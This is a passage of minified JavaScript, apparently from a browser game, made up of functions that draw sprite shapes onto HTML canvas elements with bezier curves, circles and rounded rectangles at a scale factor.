                    n.height = 173 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    r.translate(86.25 * e, 84.953125 * e),
                    A(r, 7, 9.848857801796104 * e, 5 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    r.translate(86.25 * e, 84.953125 * e),
                    A(r, 7, 9.848857801796104 * e, 5 * e),
                    r.restore(),
                    he(r, i[8], i[9], 4 * e),
                    n
            }
            function f1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 55 * e;
                return n.width = 75 * e,
                    n.height = o,
                    r.translate(-30 * e, -40 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.bezierCurveTo(67 * e, 56 * e, 72 * e, 71 * e, 72 * e, 71 * e),
                    r.bezierCurveTo(72 * e, 71 * e, 84 * e, 70 * e, 75 * e, 82 * e),
                    r.bezierCurveTo(70 * e, 88 * e, 61 * e, 89 * e, 58 * e, 89 * e),
                    r.bezierCurveTo(55 * e, 89 * e, 40 * e, 89 * e, 46 * e, 77 * e),
                    r.bezierCurveTo(46 * e, 77 * e, 43 * e, 63 * e, 43 * e, 63 * e),
                    r.bezierCurveTo(35 * e, 61 * e, 35 * e, 53 * e, 42 * e, 47 * e),
                    r.bezierCurveTo(48 * e, 42 * e, 62 * e, 41 * e, 66 * e, 43 * e),
                    r.bezierCurveTo(70 * e, 45 * e, 72 * e, 48 * e, 67 * e, 56 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.bezierCurveTo(68 * e, 61 * e, 72 * e, 76 * e, 72 * e, 76 * e),
                    r.bezierCurveTo(65 * e, 85 * e, 61 * e, 85 * e, 49 * e, 83 * e),
                    r.bezierCurveTo(49 * e, 83 * e, 44 * e, 63 * e, 44 * e, 63 * e),
                    r.bezierCurveTo(54 * e, 63 * e, 60 * e, 63 * e, 67 * e, 55 * e),
                    r.closePath(),
                    he(r, i[1]),
                    r.beginPath(),
                    r.moveTo(69 * e, 65 * e),
                    r.bezierCurveTo(70 * e, 61 * e, 81 * e, 66 * e, 86 * e, 66 * e),
                    r.bezierCurveTo(90 * e, 66 * e, 97 * e, 63 * e, 97 * e, 56 * e),
                    r.bezierCurveTo(97 * e, 50 * e, 93 * e, 47 * e, 88 * e, 44 * e),
                    he(r, !1, i[1], 2),
                    r.beginPath(),
                    r.moveTo(50 * e, 48 * e),
                    r.bezierCurveTo(43 * e, 52 * e, 50 * e, 54 * e, 51 * e, 54 * e),
                    r.bezierCurveTo(54 * e, 54 * e, 59 * e, 52 * e, 59 * e, 49 * e),
                    r.bezierCurveTo(59 * e, 48 * e, 55 * e, 46 * e, 50 * e, 48 * e),
                    he(r, i[2]),
                    n
            }
            function L1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 195 * e
                    , a = 190 * e
                    , s = o / 2
                    , _ = a / 2
                    , o = (n.width = o,
                        n.height = a,
                        10 * e)
                    , a = 35 * e
                    , E = 150 * e
                    , u = a / 2
                    , d = E / 2
                    , T = 4 * e;
                return r.translate(s - 5 * e, _ - 5 * e),
                    r.rotate(-Math.PI / 1.25),
                    r.globalAlpha = 1,
                    Ve(r, -u, -d, a, E, o),
                    he(r, i[0], i[1], T),
                    r.translate(0, 0),
                    r.rotate(Math.PI / 3),
                    r.globalAlpha = 1,
                    Ve(r, -u, -d, a, E, o),
                    he(r, i[0], i[1], T),
                    r.translate(0, 5),
                    Ve(r, -u / 2, -d / 2, a / 2, E / 3, o - 2),
                    he(r, i[1]),
                    n
            }
            function O(e, t, i, n, r) {
                var o = document.createElement("canvas")
                    , a = o.getContext("2d")
                    , s = 70 * e
                    , _ = 70 * e
                    , E = 10 * e
                    , u = 5 * e;
                o.width = s,
                    o.height = _ + u;
                for (var d = 0; d < t.length; d++) {
                    var T = t[d]
                        , A = (a.globalAlpha = T.a,
                            T.f(i, !1, T.c));
                    a.save(),
                        a.translate(s / 2 + T.x * e, _ / 2 + T.y * e),
                        a.rotate(T.r),
                        a.drawImage(A, -A.width / 2, -A.height / 2),
                        a.restore()
                }
                for (var h = [], d = 0; d < n.length; d++) {
                    var l = document.createElement("canvas")
                        , I = l.getContext("2d");
                    l.width = s,
                        l.height = _ + u,
                        I.globalAlpha = r / 2,
                        2 == d ? Ve(I, 0, u, s, _, E) : Ve(I, 0, 0, s, _ + u, E),
                        he(I, "#081a19"),
                        I.globalAlpha = r,
                        Ve(I, 0, 2 == d ? u : 0, s, _, E),
                        he(I, n[d]),
                        I.globalAlpha = 1,
                        2 == d ? I.drawImage(o, 0, u) : I.drawImage(o, 0, 0),
                        h.push(c(l))
                }
                return h
            }
            function G1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 198 * e
                    , a = 140 * e
                    , s = 90 * e
                    , o = (n.width = 193 * e,
                        n.height = o,
                        10 * e)
                    , _ = 25 * e
                    , E = 180 * e
                    , u = _ / 2
                    , d = E / 2
                    , T = 4 * e;
                return r.translate(-25 * e, +e),
                    r.translate(a, s),
                    r.rotate(-Math.PI / 5),
                    Ve(r, -u, -d, _, E, o),
                    he(r, i[0], i[1], T),
                    r.translate(-30 * e, -25 * e),
                    r.rotate(Math.PI / 3),
                    Ve(r, -u, -d, _, E, o),
                    he(r, i[0], i[1], T),
                    r.translate(35 * e, 30 * e),
                    r.rotate(Math.PI / 3),
                    Ve(r, -u, -d, _, E, o),
                    he(r, i[0], i[1], T),
                    n
            }
            function H1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 145 * e
                    , a = 145 * e
                    , s = o / 2
                    , _ = a / 2
                    , o = (n.width = o,
                        n.height = a,
                        70 * e);
                return r.translate(s, _),
                    r.globalAlpha = .4,
                    ke(r, 0, 0, o),
                    he(r, i[0]),
                    o = 50 * e,
                    r.translate(0, 0),
                    r.globalAlpha = .8,
                    ke(r, 0, 0, o),
                    he(r, i[0]),
                    o = 35 * e,
                    r.translate(0, 0),
                    r.globalAlpha = .8,
                    ke(r, 0, 0, o),
                    he(r, i[1]),
                    o = 20 * e,
                    r.translate(0, 0),
                    r.globalAlpha = .8,
                    ke(r, 0, 0, o),
                    he(r, i[2]),
                    n
            }
            function P1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 135 * e
                    , a = 190 * e
                    , s = o / 2
                    , _ = a / 2
                    , o = (n.width = o,
                        n.height = a,
                        10 * e)
                    , a = 25 * e
                    , E = 180 * e
                    , u = a / 2
                    , d = E / 2
                    , e = 4 * e;
                return r.translate(s, _),
                    r.rotate(-Math.PI / 5),
                    r.globalAlpha = 1,
                    Ve(r, -u, -d, a, E, o),
                    he(r, i[0], i[1], e),
                    r.translate(0, 0),
                    r.rotate(Math.PI / 5),
                    r.globalAlpha = 1,
                    Ve(r, -u, -d, a, E, o),
                    he(r, i[0], i[1], e),
                    n
            }
            function z1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 205 * e
                    , a = 205 * e
                    , s = o / 2
                    , _ = a / 2
                    , o = (n.width = o,
                        n.height = a,
                        100 * e);
                return r.translate(s, _),
                    r.globalAlpha = 1,
                    ke(r, 0, 0, o),
                    he(r, i[0]),
                    n
            }
            function B1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 370 * e
                    , a = 370 * e
                    , s = o / 2
                    , _ = a / 2
                    , o = (n.width = o,
                        n.height = a,
                        180 * e);
                return r.globalAlpha = .2,
                    ke(r, s, _, o),
                    he(r, i[0]),
                    n
            }
            function w1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 155 * e,
                    n.height = 127 * e,
                    r.globalAlpha = .5,
                    r.translate(0, 8 * e),
                    r.translate(-7 * e, -20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(55 * e, 68 * e),
                    r.bezierCurveTo(86 * e, 64 * e, 117 * e, 66 * e, 134 * e, 68 * e),
                    r.bezierCurveTo(152 * e, 69 * e, 165 * e, 86 * e, 152 * e, 104 * e),
                    r.bezierCurveTo(146 * e, 87 * e, 122 * e, 89 * e, 98 * e, 90 * e),
                    r.bezierCurveTo(64 * e, 89 * e, 41 * e, 91 * e, 36 * e, 106 * e),
                    r.bezierCurveTo(19 * e, 92 * e, 31 * e, 71 * e, 54 * e, 69 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -8 * e),
                    r.translate(7 * e, 20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(24 * e, 28 * e),
                    r.bezierCurveTo(39 * e, 30 * e, 37 * e, 31 * e, 40 * e, 32 * e),
                    r.bezierCurveTo(22 * e, 45 * e, 26 * e, 58 * e, 29 * e, 66 * e),
                    r.bezierCurveTo(86.5 * e, 65 * e, 86.5 * e, 65 * e, 144 * e, 64 * e),
                    r.bezierCurveTo(151 * e, 42 * e, 132 * e, 20 * e, 120 * e, 16 * e),
                    r.bezierCurveTo(106 * e, 12 * e, 89 * e, 0 * e, 73 * e, 3 * e),
                    r.bezierCurveTo(51 * e, 5 * e, 36 * e, 20 * e, 25 * e, 28 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(30 * e, 41 * e),
                    r.bezierCurveTo(49 * e, 31 * e, 53 * e, 29 * e, 62 * e, 27 * e),
                    r.bezierCurveTo(59 * e, 24 * e, 56 * e, 25 * e, 53 * e, 24 * e),
                    r.bezierCurveTo(67 * e, 15 * e, 84 * e, 12 * e, 120 * e, 16 * e),
                    r.bezierCurveTo(107 * e, 11 * e, 96 * e, 6 * e, 85 * e, 2 * e),
                    r.bezierCurveTo(59 * e, 3 * e, 54 * e, 7 * e, 40 * e, 17 * e),
                    r.bezierCurveTo(32.5 * e, 22.5 * e, 32.5 * e, 22.5 * e, 25 * e, 28 * e),
                    r.bezierCurveTo(32 * e, 30 * e, 32 * e, 30 * e, 39 * e, 32 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(24 * e, 28 * e),
                    r.bezierCurveTo(39 * e, 30 * e, 37 * e, 31 * e, 40 * e, 32 * e),
                    r.bezierCurveTo(22 * e, 45 * e, 26 * e, 58 * e, 29 * e, 66 * e),
                    r.bezierCurveTo(86.5 * e, 65 * e, 86.5 * e, 65 * e, 144 * e, 64 * e),
                    r.bezierCurveTo(151 * e, 42 * e, 132 * e, 20 * e, 120 * e, 16 * e),
                    r.bezierCurveTo(106 * e, 12 * e, 89 * e, 0 * e, 73 * e, 3 * e),
                    r.bezierCurveTo(51 * e, 5 * e, 36 * e, 20 * e, 25 * e, 28 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 4 * e),
                    ke(r, 18 * e, 38 * e, 14.866068747318506 * e),
                    he(r, i[4], i[5], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(39 * e, 30 * e),
                    r.bezierCurveTo(27 * e, 38 * e, 25 * e, 50 * e, 26 * e, 60 * e),
                    r.bezierCurveTo(36.5 * e, 58.5 * e, 36.5 * e, 58.5 * e, 47 * e, 57 * e),
                    he(r, i[1], i[2], 4 * e),
                    r.translate(-7 * e, -20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(27 * e, 74 * e),
                    r.bezierCurveTo(38 * e, 77.5 * e, 38 * e, 77.5 * e, 49 * e, 81 * e),
                    r.bezierCurveTo(54.5 * e, 75.5 * e, 54.5 * e, 75.5 * e, 60 * e, 70 * e),
                    r.bezierCurveTo(64 * e, 72 * e, 64 * e, 72 * e, 68 * e, 74 * e),
                    r.bezierCurveTo(80.5 * e, 67.5 * e, 80.5 * e, 67.5 * e, 93 * e, 61 * e),
                    r.bezierCurveTo(104.5 * e, 68 * e, 104.5 * e, 68 * e, 116 * e, 75 * e),
                    r.bezierCurveTo(120.5 * e, 72.5 * e, 120.5 * e, 72.5 * e, 125 * e, 70 * e),
                    r.bezierCurveTo(129 * e, 75 * e, 129 * e, 75 * e, 133 * e, 80 * e),
                    r.bezierCurveTo(145.5 * e, 76.5 * e, 145.5 * e, 76.5 * e, 158 * e, 73 * e),
                    r.bezierCurveTo(158 * e, 87 * e, 158 * e, 93 * e, 155 * e, 95 * e),
                    r.bezierCurveTo(152.5 * e, 96 * e, 152.5 * e, 96 * e, 150 * e, 97 * e),
                    r.bezierCurveTo(121 * e, 85 * e, 108 * e, 86 * e, 93 * e, 85 * e),
                    r.bezierCurveTo(64 * e, 85 * e, 52 * e, 95 * e, 38 * e, 99 * e),
                    r.bezierCurveTo(36 * e, 98.5 * e, 36 * e, 98.5 * e, 34 * e, 98 * e),
                    r.bezierCurveTo(25 * e, 98 * e, 27 * e, 91 * e, 27 * e, 76 * e),
                    r.closePath(),
                    he(r, i[6], i[7], 6 * e),
                    n
            }
            function W1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 155 * e,
                    n.height = 127 * e,
                    r.globalAlpha = .5,
                    r.translate(0, 8 * e),
                    r.translate(-7 * e, -20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(55 * e, 68 * e),
                    r.bezierCurveTo(86 * e, 64 * e, 117 * e, 66 * e, 134 * e, 68 * e),
                    r.bezierCurveTo(152 * e, 69 * e, 165 * e, 86 * e, 152 * e, 104 * e),
                    r.bezierCurveTo(146 * e, 87 * e, 122 * e, 89 * e, 98 * e, 90 * e),
                    r.bezierCurveTo(64 * e, 89 * e, 41 * e, 91 * e, 36 * e, 106 * e),
                    r.bezierCurveTo(19 * e, 92 * e, 31 * e, 71 * e, 54 * e, 69 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -8 * e),
                    r.translate(7 * e, 20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(24 * e, 28 * e),
                    r.bezierCurveTo(39 * e, 30 * e, 37 * e, 31 * e, 40 * e, 32 * e),
                    r.bezierCurveTo(22 * e, 45 * e, 26 * e, 58 * e, 29 * e, 66 * e),
                    r.bezierCurveTo(86.5 * e, 65 * e, 86.5 * e, 65 * e, 144 * e, 64 * e),
                    r.bezierCurveTo(151 * e, 42 * e, 132 * e, 20 * e, 120 * e, 16 * e),
                    r.bezierCurveTo(106 * e, 12 * e, 89 * e, 0 * e, 73 * e, 3 * e),
                    r.bezierCurveTo(51 * e, 5 * e, 36 * e, 20 * e, 25 * e, 28 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(30 * e, 41 * e),
                    r.bezierCurveTo(49 * e, 31 * e, 53 * e, 29 * e, 62 * e, 27 * e),
                    r.bezierCurveTo(59 * e, 24 * e, 56 * e, 25 * e, 53 * e, 24 * e),
                    r.bezierCurveTo(67 * e, 15 * e, 84 * e, 12 * e, 120 * e, 16 * e),
                    r.bezierCurveTo(107 * e, 11 * e, 96 * e, 6 * e, 85 * e, 2 * e),
                    r.bezierCurveTo(59 * e, 3 * e, 54 * e, 7 * e, 40 * e, 17 * e),
                    r.bezierCurveTo(32.5 * e, 22.5 * e, 32.5 * e, 22.5 * e, 25 * e, 28 * e),
                    r.bezierCurveTo(32 * e, 30 * e, 32 * e, 30 * e, 39 * e, 32 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(24 * e, 28 * e),
                    r.bezierCurveTo(39 * e, 30 * e, 37 * e, 31 * e, 40 * e, 32 * e),
                    r.bezierCurveTo(22 * e, 45 * e, 26 * e, 58 * e, 29 * e, 66 * e),
                    r.bezierCurveTo(86.5 * e, 65 * e, 86.5 * e, 65 * e, 144 * e, 64 * e),
                    r.bezierCurveTo(151 * e, 42 * e, 132 * e, 20 * e, 120 * e, 16 * e),
                    r.bezierCurveTo(106 * e, 12 * e, 89 * e, 0 * e, 73 * e, 3 * e),
                    r.bezierCurveTo(51 * e, 5 * e, 36 * e, 20 * e, 25 * e, 28 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 4 * e),
                    ke(r, 18 * e, 38 * e, 14.866068747318506 * e),
                    he(r, i[4], i[5], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(39 * e, 30 * e),
                    r.bezierCurveTo(27 * e, 38 * e, 25 * e, 50 * e, 26 * e, 60 * e),
                    r.bezierCurveTo(36.5 * e, 58.5 * e, 36.5 * e, 58.5 * e, 47 * e, 57 * e),
                    he(r, i[1], i[2], 4 * e),
                    r.translate(-7 * e, -20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(55 * e, 68 * e),
                    r.bezierCurveTo(86 * e, 64 * e, 117 * e, 66 * e, 134 * e, 68 * e),
                    r.bezierCurveTo(152 * e, 69 * e, 165 * e, 86 * e, 152 * e, 104 * e),
                    r.bezierCurveTo(146 * e, 87 * e, 122 * e, 89 * e, 98 * e, 90 * e),
                    r.bezierCurveTo(64 * e, 89 * e, 41 * e, 91 * e, 36 * e, 106 * e),
                    r.bezierCurveTo(19 * e, 92 * e, 31 * e, 71 * e, 54 * e, 69 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 4 * e),
                    n
            }
            function V1(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d")
                    , r = 220 * e
                    , o = 220 * e
                    , a = 32 * e
                    , s = 4 * e;
                return i.width = r,
                    i.height = o,
                    n.translate(r / 2, o / 2 + 10 * e),
                    n.globalAlpha = .5,
                    ke(n, 0, 0, a),
                    he(n, t[0], t[0]),
                    n.translate(0, -8 * e),
                    n.globalAlpha = 1,
                    ke(n, 0, 0, a),
                    he(n, t[1], t[2], s),
                    i
            }
            function k1(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d")
                    , r = 40 * e
                    , o = 40 * e
                    , a = 16 * e
                    , e = 4 * e;
                return i.width = r,
                    i.height = o,
                    n.translate(r / 2, o / 2),
                    n.globalAlpha = 1,
                    ke(n, 0, 0, a),
                    he(n, t[0], t[1], e),
                    i
            }
            function K1(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d")
                    , r = 220 * e
                    , o = 220 * e
                    , e = 16 * e;
                return i.width = r,
                    i.height = o,
                    n.translate(r / 2, o / 2),
                    n.globalAlpha = .5,
                    ke(n, 0, 0, e),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    i
            }
            function U1(e, t, i, n) {
                var r = document.createElement("canvas")
                    , o = r.getContext("2d")
                    , a = 205 * e
                    , s = 30 * e
                    , _ = 20 * e
                    , E = 200 * e
                    , u = 180 * e
                    , d = E / 2
                    , T = u / 2;
                return r.width = 210 * e,
                    r.height = a,
                    r.width = 419 * e,
                    r.height = 412 * e,
                    1 == n ? (o.save(),
                        o.translate(10 * e, 0 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(117.99996948242188 * e, 216.40621948242188 * e),
                        o.bezierCurveTo(86.99996948242188 * e, 221.40621948242188 * e, 74.99996948242188 * e, 217.40621948242188 * e, 60.999969482421875 * e, 205.40621948242188 * e),
                        he(o, void 0, t[4], 3 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(114.99996948242188 * e, 227.40621948242188 * e),
                        o.bezierCurveTo(90.99996948242188 * e, 233.40621948242188 * e, 66.99996948242188 * e, 228.40621948242188 * e, 43.999969482421875 * e, 225.40621948242188 * e),
                        he(o, void 0, t[4], 3 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(110.99996948242188 * e, 236.40621948242188 * e),
                        o.bezierCurveTo(94.99996948242188 * e, 244.40621948242188 * e, 79.99996948242188 * e, 249.40621948242188 * e, 60.999969482421875 * e, 249.40621948242188 * e),
                        he(o, void 0, t[4], 3 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(111.99996948242188 * e, 206.29513549804688 * e),
                        o.bezierCurveTo(91.99996948242188 * e, 206.29513549804688 * e, 87.99996948242188 * e, 201.29513549804688 * e, 79.99996948242188 * e, 192.29513549804688 * e),
                        he(o, void 0, t[4], 3 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(109.99996948242188 * e, 249.18402099609375 * e),
                        o.bezierCurveTo(97.99996948242188 * e, 263.18402099609375 * e, 85.99996948242188 * e, 271.18402099609375 * e, 65.99996948242188 * e, 277.18402099609375 * e),
                        he(o, void 0, t[4], 3 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(105.99996948242188 * e, 192.18402099609375 * e),
                        o.bezierCurveTo(99.49996948242188 * e, 197.68402099609375 * e, 99.49996948242188 * e, 197.68402099609375 * e, 92.99996948242188 * e, 203.18402099609375 * e),
                        o.bezierCurveTo(95.99996948242188 * e, 213.18402099609375 * e, 95.99996948242188 * e, 215.18402099609375 * e, 89.99996948242188 * e, 219.18402099609375 * e),
                        o.bezierCurveTo(91.99996948242188 * e, 223.18402099609375 * e, 91.99996948242188 * e, 226.18402099609375 * e, 87.99996948242188 * e, 230.18402099609375 * e),
                        o.bezierCurveTo(89.99996948242188 * e, 234.18402099609375 * e, 91.99996948242188 * e, 237.18402099609375 * e, 90.99996948242188 * e, 244.18402099609375 * e),
                        o.bezierCurveTo(96.99996948242188 * e, 252.18402099609375 * e, 96.99996948242188 * e, 256.18402099609375 * e, 95.99996948242188 * e, 262.18402099609375 * e),
                        o.bezierCurveTo(106.49996948242188 * e, 264.18402099609375 * e, 106.49996948242188 * e, 264.18402099609375 * e, 116.99996948242188 * e, 266.18402099609375 * e),
                        he(o, void 0, t[4], 3 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(104.99996948242188 * e, 183.29513549804688 * e),
                        o.bezierCurveTo(99.99996948242188 * e, 193.29513549804688 * e, 93.99996948242188 * e, 195.29513549804688 * e, 89.99996948242188 * e, 201.29513549804688 * e),
                        o.bezierCurveTo(86.99996948242188 * e, 212.29513549804688 * e, 85.99996948242188 * e, 214.29513549804688 * e, 81.99996948242188 * e, 215.29513549804688 * e),
                        o.bezierCurveTo(83.99996948242188 * e, 223.29513549804688 * e, 83.99996948242188 * e, 227.29513549804688 * e, 79.99996948242188 * e, 230.29513549804688 * e),
                        o.bezierCurveTo(83.99996948242188 * e, 235.29513549804688 * e, 84.99996948242188 * e, 240.29513549804688 * e, 79.99996948242188 * e, 246.29513549804688 * e),
                        o.bezierCurveTo(86.99996948242188 * e, 251.29513549804688 * e, 91.99996948242188 * e, 256.2951354980469 * e, 89.99996948242188 * e, 266.2951354980469 * e),
                        o.bezierCurveTo(102.99996948242188 * e, 269.2951354980469 * e, 102.99996948242188 * e, 269.2951354980469 * e, 115.99996948242188 * e, 272.2951354980469 * e),
                        he(o, void 0, t[4], 3 * e),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(107.99996948242188 * e, 177.85067749023438 * e),
                        o.bezierCurveTo(95.99996948242188 * e, 187.35067749023438 * e, 95.99996948242188 * e, 187.35067749023438 * e, 83.99996948242188 * e, 196.85067749023438 * e),
                        o.bezierCurveTo(82.99996948242188 * e, 203.85067749023438 * e, 80.99996948242188 * e, 209.85067749023438 * e, 72.99996948242188 * e, 210.85067749023438 * e),
                        o.bezierCurveTo(73.99996948242188 * e, 220.85067749023438 * e, 73.99996948242188 * e, 221.85067749023438 * e, 66.99996948242188 * e, 227.85067749023438 * e),
                        o.bezierCurveTo(71.99996948242188 * e, 235.85067749023438 * e, 73.99996948242188 * e, 239.85067749023438 * e, 71.99996948242188 * e, 247.85067749023438 * e),
                        o.bezierCurveTo(80.99996948242188 * e, 257.8506774902344 * e, 81.99996948242188 * e, 263.8506774902344 * e, 77.99996948242188 * e, 271.8506774902344 * e),
                        o.bezierCurveTo(95.49996948242188 * e, 272.8506774902344 * e, 95.49996948242188 * e, 272.8506774902344 * e, 112.99996948242188 * e, 273.8506774902344 * e),
                        he(o, void 0, t[4], 3 * e),
                        o.restore()) : 2 == n && (o.save(),
                            o.translate(130 * e, 35 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(170.99996948242188 * e, 133.85067749023438 * e),
                            o.bezierCurveTo(195.99996948242188 * e, 129.85067749023438 * e, 196.99996948242188 * e, 111.85067749023438 * e, 200.99996948242188 * e, 88.85067749023438 * e),
                            he(o, void 0, t[4], 3 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(169.99996948242188 * e, 143.85067749023438 * e),
                            o.bezierCurveTo(189.99996948242188 * e, 145.85067749023438 * e, 207.99996948242188 * e, 126.85067749023438 * e, 222.99996948242188 * e, 100.85067749023438 * e),
                            he(o, void 0, t[4], 3 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(170.99996948242188 * e, 157.85067749023438 * e),
                            o.bezierCurveTo(193.99996948242188 * e, 160.85067749023438 * e, 210.99996948242188 * e, 151.85067749023438 * e, 232.99996948242188 * e, 139.85067749023438 * e),
                            he(o, void 0, t[4], 3 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(169.99996948242188 * e, 168.85067749023438 * e),
                            o.bezierCurveTo(192.99996948242188 * e, 175.85067749023438 * e, 203.99996948242188 * e, 177.85067749023438 * e, 245.99996948242188 * e, 168.85067749023438 * e),
                            he(o, void 0, t[4], 3 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(167.99996948242188 * e, 168.85067749023438 * e),
                            o.bezierCurveTo(183.99996948242188 * e, 189.85067749023438 * e, 191.99996948242188 * e, 193.85067749023438 * e, 220.99996948242188 * e, 196.85067749023438 * e),
                            he(o, void 0, t[4], 3 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(176.99996948242188 * e, 117.85067749023438 * e),
                            o.bezierCurveTo(181.99996948242188 * e, 120.85067749023438 * e, 181.99996948242188 * e, 120.85067749023438 * e, 186.99996948242188 * e, 123.85067749023438 * e),
                            o.bezierCurveTo(183.99996948242188 * e, 137.85067749023438 * e, 185.99996948242188 * e, 136.85067749023438 * e, 190.99996948242188 * e, 136.85067749023438 * e),
                            o.bezierCurveTo(186.99996948242188 * e, 147.85067749023438 * e, 189.99996948242188 * e, 152.85067749023438 * e, 193.99996948242188 * e, 155.85067749023438 * e),
                            o.bezierCurveTo(187.99996948242188 * e, 165.85067749023438 * e, 190.99996948242188 * e, 169.85067749023438 * e, 190.99996948242188 * e, 172.85067749023438 * e),
                            o.bezierCurveTo(186.99996948242188 * e, 183.85067749023438 * e, 186.99996948242188 * e, 185.85067749023438 * e, 189.99996948242188 * e, 188.85067749023438 * e),
                            o.bezierCurveTo(182.49996948242188 * e, 195.35067749023438 * e, 182.49996948242188 * e, 195.35067749023438 * e, 174.99996948242188 * e, 201.85067749023438 * e),
                            he(o, void 0, t[4], 3 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(176.99996948242188 * e, 112.18402099609375 * e),
                            o.bezierCurveTo(183.99996948242188 * e, 119.18402099609375 * e, 186.99996948242188 * e, 117.18402099609375 * e, 192.99996948242188 * e, 116.18402099609375 * e),
                            o.bezierCurveTo(191.99996948242188 * e, 126.18402099609375 * e, 193.99996948242188 * e, 130.18402099609375 * e, 199.99996948242188 * e, 130.18402099609375 * e),
                            o.bezierCurveTo(194.99996948242188 * e, 145.18402099609375 * e, 197.99996948242188 * e, 147.18402099609375 * e, 201.99996948242188 * e, 153.18402099609375 * e),
                            o.bezierCurveTo(196.99996948242188 * e, 164.18402099609375 * e, 197.99996948242188 * e, 169.18402099609375 * e, 201.99996948242188 * e, 174.18402099609375 * e),
                            o.bezierCurveTo(194.99996948242188 * e, 184.18402099609375 * e, 196.99996948242188 * e, 187.18402099609375 * e, 200.99996948242188 * e, 193.18402099609375 * e),
                            o.bezierCurveTo(185.99996948242188 * e, 195.18402099609375 * e, 181.99996948242188 * e, 201.18402099609375 * e, 174.99996948242188 * e, 210.18402099609375 * e),
                            he(o, void 0, t[4], 3 * e),
                            o.beginPath(),
                            o.lineCap = "round",
                            o.lineJoin = "round",
                            o.moveTo(176.99996948242188 * e, 101.29513549804688 * e),
                            o.bezierCurveTo(181.99996948242188 * e, 108.29513549804688 * e, 189.99996948242188 * e, 110.29513549804688 * e, 195.99996948242188 * e, 107.29513549804688 * e),
                            o.bezierCurveTo(197.99996948242188 * e, 121.29513549804688 * e, 200.99996948242188 * e, 122.29513549804688 * e, 206.99996948242188 * e, 122.29513549804688 * e),
                            o.bezierCurveTo(201.99996948242188 * e, 138.29513549804688 * e, 204.99996948242188 * e, 142.29513549804688 * e, 211.99996948242188 * e, 148.29513549804688 * e),
